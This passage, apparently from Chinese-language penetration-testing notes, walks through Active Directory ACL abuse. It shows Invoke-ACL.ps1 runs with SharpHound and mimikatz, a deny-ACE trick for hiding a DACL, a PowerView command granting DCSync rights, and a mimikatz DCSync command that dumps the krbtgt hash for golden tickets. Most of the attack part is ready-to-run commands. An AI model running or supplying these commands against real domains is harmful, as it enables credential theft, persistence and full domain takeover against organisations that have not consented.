.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
```
使用第一条标识了-NoDCSync（不会做DCSync的动作，只判断是否能够存在能够DCSync的权限）的命令：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1612192688086-69baae16-39b9-48ed-9ce6-e518587cefb2.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=1120&size=236700&status=done&style=none&width=560)




提示Got WriteDACL permissions.如果加上mimikatz.exe一起使用,可以看到直接获取了krbtgt的HASH值，也就是说已经可以直接生成黄金票据了：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1612192699236-2ca31341-3ac2-4ce8-b2f7-d298400de769.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=365&originWidth=1120&size=269184&status=done&style=none&width=560)
自动化工具缺点是面对大型的域,得分析到啥时候


DACL的隐身方式
设置一条拒绝完全控制的ACE
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1612192921976-7358bc92-95a4-43dd-8204-3d3cbbe1f954.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1120&size=365931&status=done&style=none&width=560)
```cpp
Get-DomainObjectAcl -Identity hideuser -domain test.local -Resolve
```
## 
## 
## CVE-2019-1040
[https://mp.weixin.qq.com/s/NEBi8NflfaEDL2qw1WIqZw](https://mp.weixin.qq.com/s/NEBi8NflfaEDL2qw1WIqZw)


### DCSYNC


DCSync需要什么权限

- 复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes) 
- 复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个） 
- 正在复制筛选集中的目录更改Replicating Directory Changes In Filtered Set (rare, only required in some environments)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1612192317006-67a9a932-e372-46e9-a4d0-36822e503641.png#align=left&display=inline&height=120&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=1150&size=228830&status=done&style=none&width=575)
```cpp
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=local" -PrincipalIdentity zhangs -Rights DCSync
```
```cpp
然后使用zhangs进行DCSync，这里可以看到添加前后的变化：

.\mimikatz.exe "lsadump::dcsync /user:test\krbtgt" "exit"
```


